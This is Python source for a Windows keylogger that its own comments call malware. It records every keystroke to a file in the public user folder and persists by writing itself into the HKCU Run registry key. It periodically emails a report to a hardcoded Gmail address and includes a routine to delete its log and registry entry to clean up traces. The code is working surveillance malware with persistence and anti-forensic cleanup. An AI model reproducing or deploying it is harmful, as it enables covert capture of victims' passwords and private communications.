from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
import time
from datetime import datetime
import winreg
import sys
import os
import smtplib
from email.mime.text import MIMEText
from mail import send_email

#Buffer to hold the keystrokes before logging
text = ""

# Track the last time the buffer was logged
lastLogTime = time.time()

#log text path
logPath=r"C:\Users\Public\Keylogs.txt"

# setting up the logger to write the keylogs.txt 
logging.basicConfig(filename=(text + logPath),level=logging.DEBUG, format='%(message)s')

# function to delete the keylog file
def delete_keylog_file():
    for handler in logging.root.handlers[:]:
        handler.close()
        logging.root.removeHandler(handler)
    if os.path.exists(logPath):
        os.remove(logPath)
        print("\nFile deleted successfully\n")

# function to clean up the things we have done 
def cleanup():
    remove_from_startup()
    delete_keylog_file()
    print("\nCleaned up the traces :)\n")

# Function to remove the path from the registry
def remove_from_startup():
    """Remove script from Windows startup"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.DeleteValue(key, "keylogger")
        winreg.CloseKey(key)
        print("Successfully removed from startup!")
        return True
        
    except Exception as e:
        print(f"Failed to remove from startup: {e}")
        return False

# function to add the malware to the windows registry
def add_to_startup():
    """Add current script to Windows startup via registry"""
    try:
        # Get the path to the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Create the command to run (python + script path)
        python_path = sys.executable
        startup_command = f'"{python_path}" "{script_path}"'
        
        # Open registry key for startup programs
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        # Add entry 
        winreg.SetValueEx(
            key,
            "keylogger",  # Name that appears in startup
            0,
            winreg.REG_SZ,
            startup_command
        )
        
        winreg.CloseKey(key)
        print("Successfully added to startup!")
        return True
        
    except Exception as e:
        print(f"Failed to add to startup: {e}")
        return False

# List (or better: set) of special keys you want to log
special_keys = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.esc,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.cmd_l,
    keyboard.Key.cmd_r,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.insert,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
    keyboard.Key.home,
    keyboard.Key.end,
    keyboard.Key.page_up,
    keyboard.Key.page_down,
    keyboard.Key.num_lock,
    keyboard.Key.scroll_lock,
    keyboard.Key.print_screen,
    keyboard.Key.pause,
    keyboard.Key.menu,
    keyboard.Key.media_volume_down,
    keyboard.Key.media_volume_mute,
    keyboard.Key.media_volume_up,
    keyboard.Key.media_play_pause,
    keyboard.Key.alt_gr
}

#function: to handle different type of key strokes
def on_press(key):
    global text, lastLogTime, special_keys # to use the text and lastlogtime variable inside the function
    
    # handle special keys: append readable notations or perform specific action
    if key == keyboard.Key.enter:
        text += "\n" # New line for enter key
    elif key == keyboard.Key.tab:
        text += "\t" # Tab character for tab key
    elif key == keyboard.Key.space:
        text += " "  # Space for space key
    elif key in  special_keys:
        text += f" [{key}] "
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    else:
    # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

    print(text)
    # Do the following things every 5 minutes(300 seconds)
    if time.time() -lastLogTime > 180 :
        # log the data so far collected
        logging.info(str(text))
        logging.info(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        # check if the data have the following word it is there only for testing purpose
        #  in real malware we don't need this part if the "quit" word is there in the data 
        # we will do the cleaning process
        # if "quit" in text: 
        #     cleanup()
        #     return False
        
        # text = ""
        # lastLogTime = time.time()

    # now = datetime.now()
    # if now.hour == 0 and now.minute == 0 :
        reciever = "bidya.gca@gmail.com"
        sub = "keylog of the day"
        body = f"Todays date and time: {datetime.now()}"
        send_email(reciever,sub,body)

        if "quit" in text: 
            cleanup()
            return False
        
        text = ""
        lastLogTime = time.time()



if __name__ == "__main__":
    add_to_startup()
    with Listener(on_press = on_press) as listener:
        listener.join()